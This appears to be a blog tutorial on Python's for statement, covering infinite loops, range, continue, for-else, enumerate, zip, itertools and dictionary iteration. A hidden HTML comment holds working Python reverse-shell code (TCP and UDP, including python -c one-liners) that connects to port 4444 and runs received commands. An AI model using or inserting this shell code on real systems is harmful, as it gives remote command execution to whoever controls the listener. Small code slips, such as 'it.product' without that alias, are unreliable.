---
layout: post
title: "🔁 Fundamentals Of Digital Discipleship, Part XIV: The For Statement"
date: 2023-03-10 02:15:00 -0500
categories: digital computer programming python ministry
published: true
---

<!-- <span style="font-style:Italic;font-size:32px;">Chapter Header</span>

<span style="font-style:Italic;font-size:24px;">Sub Chapter Header</span> -->


<a href="https://docs.python.org/3/reference/compound_stmts.html#the-for-statement" style="font-weight:italic;font-size:2em;">The For Statement</a>

<span style="font-size:1.6em;">The Infinite Loop</span>

Generally we would use a while loop to create an infinite loop; however, so as to be thorough, I'll provide a few examples of an infinite loop using the for statement. Itertools comes in handy with its count and repeat methods.

```py
import itertools

# Count up
for i in itertools.count():
    # Do something infinitely
    # with available count
    print(f"{i}", end=" ")

# Countdown
for i in itertools.count(start=10, step=-1):
    # Do something infinitely
    # with a negative count
    print(f"{i}", end=" ")

# Loop infinitely
for i in itertools.repeat(None):
    # Do something infinitely
    print(f"{i}", end=" ")
```

There's another, somewhat unorthodox, method of creating an infinite loop with the for statement. This comes in handy with one-liners where you're trying to avoid any imports. From the command line for instance.

```py
# Unorthodox Infinite Loop
for i in iter(int, 1):
    # Do something infinitely
    print(f"{i}", end=" ")

# Infinite list comprehensions
[print(_) for _ in iter(int, 1)]
[print(_) for _ in iter(lambda:0, 1)]

# Infinite list comprehensions w/ count
[print(i) for i in itertools.count()]

# Infinite list comprehensions w/ negative count
[print(i) for i in itertools.count(step=-1)]
[print(i) for i in itertools.count(start=10, step=-1)]
```

<!-- An advanced example, that you do not need to comprehend, might be

## **Command Line**

The command line requires that we invent a one line solution so we have to rethink our design a bit. This is the most succinct `persistent reverse shell` that I could come up with at the moment of this writing. The backbone of the infinite loop is this snippet: `[print(_) for _ in iter(int, 1)]`, because int() always returns 0 and the sentinel value is 1 which is never met, we have created an infinite for loop list comprehension that will work in a one-liner. 

Remember that `socket()` defaults to AF_INET (IPv4) and SOCK_STREAM (TCP) so we don't need to waste space in our string importing and using those properties. We've also taken advantage of setting stderr to STDOUT which indicates that the stderr data from the application should be captured into the same file handle as stdout. This saves more space now that we don't have to append proc.stderr.read().

Because sockets are `automatically closed when they are garbage-collected`, despite the fact that it is recommended to use `with` or `close()`, we could probably neglect their use in this context.

# Reverse Shell

```python
from socket     import *
from subprocess import *

# @infinite
def reverse_shell():
    s = socket()
    s.connect(('127.0.0.1', 4444))
    # s = create_connection(('127.0.0.1', 4444))
    [ 
        s.send(
            Popen(
                args=str(s.recv(512), 'ascii'),
                stdout=PIPE,stderr=STDOUT,shell=True
            ).stdout.read()
        ) for _ in iter(int, 1) #..iter(lambda:0, 1) also
    ]
    # s.close() relying on garbage collector to shorten code

if __name__ == "__main__":
    reverse_shell()
```

```python
python -c "from socket import *;from subprocess import *;s = socket();s.connect(('127.0.0.1', 4444));[s.send(Popen(args=str(s.recv(512), 'ascii'),stdout=PIPE,stderr=STDOUT,shell=True).stdout.read()) for _ in iter(int, 1)];"
```

```python
python -c "from socket import *;from subprocess import *;s = create_connection(('127.0.0.1', 4444));[s.send(Popen(args=str(s.recv(512), 'ascii'),stdout=PIPE,stderr=STDOUT,shell=True).stdout.read()) for _ in iter(int, 1)];"
```

# Reverse Shell (UDP)

```python
from subprocess import *
from socket     import *

@infinite
def reverse_shell_udp():
    ADDR = ('127.0.0.1', 4444)
    s = socket(type=SOCK_DGRAM)
    s.sendto(b': ', ADDR) 
    [
        s.sendto(
            Popen(
                args = str(s.recvfrom(512)[0], 'ascii'),
                stdout = PIPE, stderr = STDOUT, shell = True
            ).stdout.read(),
            ADDR
        ) for _ in iter(int, 1) 
    ]
    
if __name__ == "__main__":
    reverse_shell_udp()
```

```python
python -c "from subprocess import *;from socket import *;ADDR = ('127.0.0.1', 4444);s = socket(type=SOCK_DGRAM); s.sendto(b': ', ADDR);[s.sendto(Popen(args = str(s.recvfrom(512)[0], 'ascii'),stdout = PIPE, stderr = STDOUT, shell = True).stdout.read(), ADDR) for _ in iter(int, 1)]"
``` -->

<span style="font-size:1.6em;">Breaking Out Of The Loop</span>

Because for loops are rarely, if ever, used with an infinite condition, now is a good time to introduce the [range](https://docs.python.org/3/library/stdtypes.html#ranges) keyword. 

> The range type represents an immutable sequence of numbers and is commonly used for looping a specific number of times in for loops.

The [list built-in](https://docs.python.org/3/library/functions.html) helps us visualize the output from range (immutable sequence type)

```py
# [0, 1, 2, 3, 4, 5, 6, 7, 8, 9]
# Same as list(range(0, 10))
list(range(10))

# [9, 8, 7, 6, 5, 4, 3, 2, 1, 0]
list(range(9, -1, -1))

# [1, 2, 3, 4, 5, 6, 7, 8, 9, 10]
list(range(1, 10+1))

# [10, 9, 8, 7, 6, 5, 4, 3, 2, 1]
list(range(10, 0, -1))
```

Now that we understand range a bit better, let's see how we can combine it with the for statement for something very powerful and efficient.

```py
# 0 1 2 3 4 5 6 7 8 9
for i in range(10):
    print(i, end=" ")
```

Here are comparisons using while. You can see how much more verbose they are by comparison to the for example. The utilization of an assignment expression with the walrus operator does give a succinct example of an equivalent while; however, nothing is so simple as the for statement for this purpose.

```py
# 0 1 2 3 4 5 6 7 8 9
i = 0
while True:
    print(i, end=" ")
    i += 1
    if i == 10:
        break

# 0 1 2 3 4 5 6 7 8 9
i = 0
while i < 10:
    print(i, end=" ")
    i += 1

# 0 1 2 3 4 5 6 7 8 9
i = -1
while (i := i + 1) < 10:
    print(i, end=" ")
```

Now watch how simple it is to reverse using the for statement and the [reversed](https://docs.python.org/3/library/functions.html#reversed) keyword.

```py
# 9 8 7 6 5 4 3 2 1 0
for i in reversed(range(10)):
    print(i, end=" ")
```

Now let's, once again, look at all the extra work we would have to do if we decided to use a while loop for iteration.

```py
# 9 8 7 6 5 4 3 2 1 0
i = 9
while True:
    print(i, end=" ")
    if i == 0:
        break

    i -= 1

# 9 8 7 6 5 4 3 2 1 0
# same as while i > -1:
i = 9
while i >= 0:
    print(i, end=" ")
    i -= 1

# 9 8 7 6 5 4 3 2 1 0
# same as while (i := i - 1) > -1:
i = 10
while (i := i - 1) >= 0:
    print(i, end=" ")
```

<span style="font-size:1.6em;">Skipping An Iteration With Continue</span>

```py
# 0 1 2 [skipped] 4 5 6 7 8 9
for i in range(10):
    if i == 3:
        print("[skipped]", end=" ")
        continue
    
    print(i, end=" ")

# 9 8 7 6 5 4 [skipped] 2 1 0 
for i in reversed(range(10)):
    if i == 3:
        print("[skipped]", end=" ")
        continue
    
    print(i, end=" ")
```

By comparison, the while is much more verbose for this purpose.

```py
# 0 1 2 [skipped] 4 5 6 7 8 9
count = -1
while (count := count + 1) < 10:
    if count == 3:
        print("[skipped]", end=" ")
        continue

    print(f"{count}", end=" ")

# 9 8 7 6 5 4 [skipped] 2 1 0 
count = 10
while (count := count - 1) >= 0:
    if count == 3:
        print("[skipped]", end=" ")
        continue

    print(f"{count}", end=" ")
```

<span style="font-size:1.6em;">Else Within For Loop</span>

When an else is used with a for loop, this specifies a block of code that will be executed if the loop is NOT stopped by a break statement. So, in other words, if no breaks were encountered, the block of code after the else clause is executed.

One way you can think of it is as a successful run where no problems were encountered, problems you assign with the break keyword.

```py
# The else clause's code block will execute
for i in range(1, 10+1):
    print(i)
else:
    print("Encountered no break")

# break was encountered, else will not execute
for i in range(1, 10+1):
    print(i)
    if i == 7:
        break
else:
    print("Encountered no break")
```

You could also view it in this way. If an element or value is missing from a list or data structure of some kind, the fact that the break was never encountered, would signal the raise of an exception to be handled.

```py
# example using a range
try:
    for i in range(1, 10+1):
        print(i)
        if i == 100:
            break
    else:
        raise ValueError("Missing value")

except ValueError as error:
    print(f"[!] {error}: 100 not found")
```

Because the break was never encountered, the waffle was not found. Put another way, because waffle was not found, and the break never encountered, the else clause's code block is executed, signaling the absence of the... waffle.

```py
# example using a list
food = ["cake", "donut", "pancake"]
want = "waffle"

try:
    for i in food:
        print(i.capitalize())
        if i == want:
            break
    else:
        raise ValueError("Missing food")

except ValueError as error:
    print(f"[!] {error}: {want.capitalize()} not found")
```

<span style="font-size:1.6em;">Working With Lists</span>

Iterating through a list is a somewhat effortless process with the for statement. If you haven't already gone through our article on the list built-in type, you may want to do that before tackling this.

```py
leaves = ["maple", "chestnut", "birch", "walnut", "oak", "sassafras", "ash", "sumac", "red maple", "beech", "aspen", "cherry", "poplar", "tulip tree", "dogwood"]

for leaf in leaves:
    print(f"leaf: {leaf}")

'''
leaf: maple
leaf: chestnut
leaf: birch
leaf: walnut
leaf: oak
leaf: sassafras
leaf: ash
leaf: sumac
leaf: red maple
leaf: beech
leaf: aspen
leaf: cherry
leaf: poplar
leaf: tulip tree
leaf: dogwood
'''
```

We can also easily add a count with the enumerate keyword.

```py
for i, leaf in enumerate(leaves, start=1):
    print(f"{i:>02} {leaf}")

'''
01 maple
02 chestnut
03 birch
04 walnut
05 oak
06 sassafras
07 ash
08 sumac
09 red maple
10 beech
11 aspen
12 cherry
13 poplar
14 tulip tree
15 dogwood
'''
```

<span style="font-size:1.6em;">Nested Loops</span>


Nested loops provide a simple method for comparing one list against another. For each iteration of the outer loop, the inner loop will be executed sequentially. In this example, each element in the outer loop is tested against every element in the inner loop.


```py
for i in  [1, 2, 3]:
    for j in ["a","b","c"]:
        print(i, j)
'''
1 a
1 b
1 c
2 a
2 b
2 c
3 a
3 b
3 c
'''
```

There is also a few ways we can carry out a cartesian product of input iterables. One way is with a nested for loop and the other is with the itertools product method.

```py
x = ["a", "b", "c"]

for i in x:
    for j in x:
        for k in x:
            print(i,j,k)

# alternatively
from itertools import product

for i, j, k in it.product(x, repeat=3):
    print(i,j,k)

'''
a a a
a a b
a a c
a b a
a b b
a b c
a c a
a c b
a c c
b a a
b a b
b a c
b b a
b b b
b b c
b c a
b c b
b c c
c a a
c a b
c a c
c b a
c b b
c b c
c c a
c c b
c c c
'''
```

Permutations are also very useful.

```py
from itertools import permutations as perm

for i in perm(["a","b","c"]):
    print(i)

'''
('a', 'b', 'c')
('a', 'c', 'b')
('b', 'a', 'c')
('b', 'c', 'a')
('c', 'a', 'b')
('c', 'b', 'a')
'''
```

Aside from [range](https://docs.python.org/3/library/functions.html#func-range), [reversed](https://docs.python.org/3/library/functions.html#reversed), and [enumerate](https://docs.python.org/3/library/functions.html#enumerate), there is another built-in function called [zip](https://docs.python.org/3/library/functions.html#zip) that comes in handy quite often. This is really useful when you want to compare the elements in separate lists, sequentially.

```py
x = [1, 3, 5, 7, 9 ]
y = [2, 4, 6, 8, 10]

for i,j in zip(x,y):
    print(i, j)

'''
1 2
3 4
5 6
7 8
9 10
'''
```

The zip built-in function prevents us from having to code something like this.

```py
x = [1, 3, 5, 7, 9 ]
y = [2, 4, 6, 8, 10]

for i in range(len(min([x, y]))):
    print(x[i], y[i])

'''
1 2
3 4
5 6
7 8
9 10
'''

# alternatively
for i,_ in enumerate(min([x, y])):
    print(x[i], y[i])

'''
1 2
3 4
5 6
7 8
9 10
'''
```

<span style="font-size:1.6em;">Working With Dictionaries</span>

If you haven't already gone through our article on the dictionary built-in type, you may want to do that before tackling this. Dictionaries are another useful data type built into Python, and are sometimes called *“associative arrays”* in other languages. Whereas sequences (lists, tuples, etc.) are indexed by a range of numbers, dictionaries are indexed by keys. Keys can be any immutable type (i.e. strings and numbers).

```py
# These are equivalent assignments
x = dict(one=1, two=2, three=3)
x = {"one": 1, "two": 2, "three": 3}

x["two"]
2

for i,j in x.items():
    print(f"{i.capitalize():<5} {j}")

'''
One   1
Two   2
Three 3
'''
```


Here is another example, continuing on from the previous leaf theme. Descriptions provided by the [U.S. Food & Drug Administration](https://www.fda.gov/consumers/consumer-updates/outsmarting-poison-ivy-and-other-poisonous-plants).

> The objects returned by dict.keys(), dict.values() and dict.items() are view objects. They provide a dynamic view on the dictionary’s entries, which means that when the dictionary changes, the view reflects these changes. &mdash; [Dictionary view objects](https://docs.python.org/3/library/stdtypes.html#dict-views)

```py
yikes = {
    "Poison Ivy"   : "Found throughout the United States except Alaska, Hawaii, and parts of the West Coast. Can grow as a vine or small shrub trailing along the ground or climbing on low plants, trees and poles. Each leaf has three glossy leaflets, with smooth or toothed edges. Leaves are reddish in spring, green in summer, and yellow, orange, or red in fall. May have greenish-white flowers and whitish-yellow berries.",
    "Poison Oak"   : "Grows as a low shrub in the Eastern and Southern United States, and in tall clumps or long vines on the Pacific Coast. Fuzzy green leaves in clusters of three are lobed or deeply toothed with rounded tips. May have yellow-white berries.",
    "Poison Sumac" : "Grows as a tall shrub or small tree in bogs or swamps in the Northeast, Midwest, and parts of the Southeast. Each leaf has clusters of seven to 13 smooth-edged leaflets. Leaves are orange in spring, green in summer, and yellow, orange, or red in fall. May have yellow-greenish flowers and whitish-green fruits hang in loose clusters."
}
```

```py
for name, description in yikes.items():
    print(f"{name}: {description}", end="\n"*2)

# We can use pprint to "prettify" the output
from pprint import pprint as pp

for name, description in yikes.items():
    pp(f"{name}: {description}")

'''
('Poison Ivy: Found throughout the United States except Alaska, Hawaii, and '
 'parts of the West Coast. Can grow as a vine or small shrub trailing along '
 'the ground or climbing on low plants, trees and poles. Each leaf has three '
 'glossy leaflets, with smooth or toothed edges. Leaves are reddish in spring, '
 'green in summer, and yellow, orange, or red in fall. May have greenish-white '
 'flowers and whitish-yellow berries.')
('Poison Oak: Grows as a low shrub in the Eastern and Southern United States, '
 'and in tall clumps or long vines on the Pacific Coast. Fuzzy green leaves in '
 'clusters of three are lobed or deeply toothed with rounded tips. May have '
 'yellow-white berries.')
('Poison Sumac: Grows as a tall shrub or small tree in bogs or swamps in the '
 'Northeast, Midwest, and parts of the Southeast. Each leaf has clusters of '
 'seven to 13 smooth-edged leaflets. Leaves are orange in spring, green in '
 'summer, and yellow, orange, or red in fall. May have yellow-greenish flowers '
 'and whitish-green fruits hang in loose clusters.')
'''
```

```py
for name in yikes.keys():
    print(name)

'''
Poison Ivy
Poison Oak
Poison Sumac
'''
```

```py
for description in yikes.values():
    print(description, end="\n"*2)

# We can use pprint to "prettify" the output
from pprint import pprint as pp

for description in yikes.values():
    pp(description)
'''
('Found throughout the United States except Alaska, Hawaii, and parts of the '
 'West Coast. Can grow as a vine or small shrub trailing along the ground or '
 'climbing on low plants, trees and poles. Each leaf has three glossy '
 'leaflets, with smooth or toothed edges. Leaves are reddish in spring, green '
 'in summer, and yellow, orange, or red in fall. May have greenish-white '
 'flowers and whitish-yellow berries.')
('Grows as a low shrub in the Eastern and Southern United States, and in tall '
 'clumps or long vines on the Pacific Coast. Fuzzy green leaves in clusters of '
 'three are lobed or deeply toothed with rounded tips. May have yellow-white '
 'berries.')
('Grows as a tall shrub or small tree in bogs or swamps in the Northeast, '
 'Midwest, and parts of the Southeast. Each leaf has clusters of seven to 13 '
 'smooth-edged leaflets. Leaves are orange in spring, green in summer, and '
 'yellow, orange, or red in fall. May have yellow-greenish flowers and '
 'whitish-green fruits hang in loose clusters.')
'''
```

<script>
    var refTagger = {
        settings: {
            bibleVersion: 'ESV'
        }
    }; 

    (function(d, t) {
        var n=d.querySelector('[nonce]');
        refTagger.settings.nonce = n && (n.nonce||n.getAttribute('nonce'));
        var g = d.createElement(t), s = d.getElementsByTagName(t)[0];
        g.src = 'https://api.reftagger.com/v2/RefTagger.js';
        g.nonce = refTagger.settings.nonce;
        s.parentNode.insertBefore(g, s);
    }(document, 'script'));
</script>